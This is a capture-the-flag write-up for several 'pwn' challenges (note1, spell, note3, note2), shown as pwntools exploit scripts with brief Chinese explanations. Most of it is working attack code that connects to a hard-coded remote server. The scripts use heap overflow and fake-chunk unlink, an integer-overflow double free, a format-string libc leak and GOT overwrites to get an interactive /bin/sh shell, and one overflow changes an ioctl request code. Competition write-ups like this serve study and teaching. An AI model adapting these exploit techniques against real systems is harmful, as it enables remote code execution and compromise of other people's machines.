from pwn import * 
#io = process('./note1') 
io = remote('115.28.27.103', 9001) 
addr = 0x601fa8 
puts_off = 0x6FE30 
read_off = 0xEB800 
system_off = 0x46640 
def addnote(title,types,content): 
global io 
print io.recvuntil('option--->>') 
io.sendline('1') 
print io.recvuntil(':') 
io.sendline(title) 
print io.recvuntil(':') 
io.sendline(types) 
print io.recvuntil(':') 
io.sendline(content) 
return 
def editnote(title,content): 
global io 
print io.recvuntil('option--->>') 
io.sendline('3') 
print io.recvuntil(':') 
io.sendline(title) 
print io.recvuntil(':') 
io.sendline(content) 
return 
def shownote(): 
print io.recvuntil('option--->>\n') 
io.sendline('2') 
return 
def main(): 
payload = (0x100+0x10)*'a'+p64(0)+p64(addr)+'bbbb' 
addnote('a','b','c') 
addnote('b','c','d') 
editnote('a',payload) 
shownote() 
print io.recvuntil('\n') 
print io.recvuntil('content=') 
buf = io.recvuntil('\n')[:-1] + '\x00\x00' 
puts = u64(buf) 
libc_base = puts - puts_off 
log.success('Libc base = ' + hex(libc_base)) 
read = libc_base + read_off 
system = libc_base + system_off 
new_got = p64(puts) + 'a'*24+p64(read)+'a'*40+p64(system) 
editnote('',new_got) 
io.sendline('/bin/sh') 
io.interactive() 
return 0 
if __name__ == '__main__': 
main() 
- spell (pwn 300) 
刚开始以为是要做内核溢出... 
将内核模块和程序下载下来，分析内核模块，发现内核模块处理两个 ioctl，一个是获取时间，
另一个是获取随机数(都是 8 个字节)，然后分析程序，发现在复制输入的时候可以溢出到第
二次的 request code 处，而第二次的 request code 正是用来请求随机数的，所以溢出将其修
改为获取时间的 request code，可以根据当前时间计算出 spell，得到 flag。 
脚本： 
#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
from pwn import * 
io = remote('115.28.27.103',33333) 
def makespell(randombuf): 
key = 'zctfflag' 
buf = '' 
length = 56 
temp = [] 
for i in range(8): 
temp.append(chr(ord(randombuf[i])^ord(key[i]))) 
buf = ''.join(temp)*7 
buf += '\x00' 
buf = buf + (256-len(buf))*'a'+'\x02\xff' # overwrite request_code 
to req_gettime and you got stable 'random bytes' 
print buf.encode('hex') 
return buf 
def main(): 
print io.recvuntil(':') 
io.sendline('256') 
time1 = io.recvuntil(':')[-3:] 
time2 = io.recvuntil(':')[-3:] 
time = time1+time2+' '+'\x00' 
# replace random :> 
print io.recvuntil(':') 
io.send(makespell(time)) 
io.interactive() 
return 0 
if __name__ == '__main__': 
main() 
- note3 (pwn 300)  
这题首先有个整数溢出，溢出完之后可以造成 double free，另外由于读入的
长度和 malloc 后的指针存放位置相邻并且是在 i＋8 的位置所以可以读入超长数
据，接下来要伪造 chunk 触发 double free，然后就有了任意地址写。泄露地址时，
将 free got 表项和后面的 puts got 表项修改成 printf 的 plt，然后将 printf 的参数
部署到 bss 段，接下来再调用 free 即可泄露地址，拿到地址后再把 free 的 got 表
项改成 system，构造参数后就能拿到 shell 啦～ 
#!/usr/bin/python 
# -*- coding: utf-8 -*- 
from pwn import * 
import time 
def malloc(size,data): 
print conn.recvuntil('>>') 
conn.sendline('1') 
print conn.recvuntil('1024)') 
conn.sendline(str(size)) 
print conn.recvuntil('content:') 
conn.sendline(data) 
print conn.recvuntil('\n') 
def edit(id,data): 
print conn.recvuntil('>>') 
conn.sendline('3') 
print conn.recvuntil('note:') 
conn.sendline(str(id)) 
print conn.recvuntil('ent:') 
conn.sendline(data) 
print conn.recvuntil('success') 
def free(id): 
print conn.recvuntil('>>') 
conn.sendline('4') 
print conn.recvuntil('note:') 
conn.sendline(str(id)) 
print conn.recvuntil('success') 
#conn = remote('127.0.0.1',9999) 
conn = remote('115.28.27.103',9003) 
free_got = p64(0x602018) 
puts_got = p64(0x602020) 
stack_got = p64(0x602038) 
printf_got = p64(0x602030) 
exit_got = p64(0x602078) 
printf_plt = p64(0x400750) 
puts_plt = p64(0x400730) 
#libcstartmain_ret_off = 0x21b45 
#sys_off = 0x414f0 
libcstartmain_ret_off = 0x21ec5 
sys_off = 0x46640 
# 1. int overflow lead to double free 
intoverflow = -9223372036854775808 
malloc(512,'/bin/sh\0') 
malloc(512,'/bin/sh\0') 
malloc(512,'/bin/sh\0') 
malloc(512,'/bin/sh\0') 
malloc(512,'/bin/sh\0') 
malloc(512,'/bin/sh\0') 
malloc(512,p64(0x400ef8)) 
malloc(512,'/bin/sh\0') 
# 2. make a fake chunk and modify the next chunk's pre size  
fakechunk = p64(0) + p64(512+1) + p64(0x6020e0-0x18) + p64(0x6020e0-
0x10) + 'A'*(512-32) + p64(512) + p64(512+16) 
edit(3,'aaaaaa') 
edit(intoverflow,fakechunk) 
# 3. double free 
free(4) 
# 4. overwrite got 
edit(3,free_got) 
edit(0,printf_plt+printf_plt) 
# 5. leak the stack data 
edit(3,p64(0x6020e8)) 
edit(0,'%llx.'*30) 
#free->puts 
print conn.recvuntil('>>') 
conn.sendline('4') 
print conn.recvuntil('note:') 
conn.sendline(str(0)) 
#time.sleep(0.3) 
ret =  conn.recvuntil('success') 
print ret 
# 6. calcuate the system's addr 
libcstart = ret.split('.')[10] 
libcstart_2 = int(libcstart,16) - libcstartmain_ret_off 
print 'libc start addr:',hex(libcstart_2) 
system_addr = libcstart_2 + sys_off 
print 'system_addr:',hex(system_addr) 
# 7. overwrite free's got 
edit(3,free_got) 
edit(0,p64(system_addr)+printf_plt) 
# 8. write argv 
edit(3,p64(0x6020d0)) 
edit(0,'/bin/sh\0') 
# 9. exploit 
print conn.recvuntil('>>') 
conn.sendline('4') 
print conn.recvuntil('note:') 
conn.sendline(str(0)) 
sleep(0.2) 
conn.interactive() 
- note2 (pwn 400)  
分析程序发现在 edit 处有栈溢出，但是由于有 canary 所以没法直接 get shell，
但是可以控制要 free 的指针。同时，在获取输入时，如果将 note 长度置为 0，
则可以过掉 edit 处的限制。利用 name 和 address 处的内存伪造堆块，利用栈溢
出将其 free，再次申请内存时就可以得到伪造的堆块，然后将 name 后面的指针
表改写到 got，利用 show 功能 free，然后 edit 修改 got 即可拿到 shell。 
脚本： 
#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
from pwn import * 
#io = process('./note2') 
io = remote('115.28.27.103', 9002) 
atoi_off = 0x39F50 
system_off = 0x46640 
def addnote(length,content): 
global io 
print io.recvuntil('option--->>') 
io.sendline('1') 
print io.recvuntil(')') 
io.sendline(str(length)) 
print io.recvuntil(':') 
io.sendline(content) 
return 
def delnote(id): 
global io 
print io.recvuntil('option--->>') 
io.sendline('4') 
print io.recvuntil(':') 
io.sendline(str(id)) 
return 
def editnote(id,oa,content): 
global io 
print io.recvuntil('option--->>') 
io.sendline('3') 
print io.recvuntil(':') 
io.sendline(str(id)) 
print io.recvuntil(']') 
io.sendline(str(oa)) 
print io.recvuntil(':') 
io.sendline(content) 
return 
def main(): 
name = 0x20*'\x00'+p64(0)+p64(0x91)+(0x8)*'\x00' # fake chunks 
address = '\x00'*0x10+p64(0)+p64(0x31)+0x20*'\x00'+p64(0)+p64(0x21)
# fake chunks 
#raw_input('Attach now!') 
print io.recvuntil(':') 
io.sendline(name) 
print io.recvuntil(':') 
io.sendline(address) 
k = 127 
# find a way to free 0x602110 
addnote(128,'bbb') 
addnote(0,'aaa') # '0' bypasses everthing :> 
addnote(128,'cccc') 
# ????? why always 39 chars appended????? but not in online env,,, 
# somekind of strncat bug? 
editnote(1,1,39*'a') # 39 added per append 
editnote(1,2,39*'b') # 78 
editnote(1,2,39*'c') # 117 
editnote(1,2,10*'d') 
editnote(1,2,'a'*(128-k)+p64(0x602110)) 
addnote(128,0x10*'a'+p64(0x602088)) 
print io.recvuntil('option--->>') 
io.sendline('2') 
print io.recvuntil(':') 
io.sendline('0') 
print io.recvuntil('is ') 
buf = io.recvuntil('\n')[:-1] + '\x00\x00' 
atoi = u64(buf) 
libc_base = atoi - atoi_off 
log.success('Libc Base = ' + hex(libc_base)) 
system = libc_base + system_off 
editnote(0,1,p64(system)) 
print io.recvuntil('option--->>') 
io.sendline('/bin/sh') 
io.interactive() 
return 0 
if __name__ == '__main__': 
main()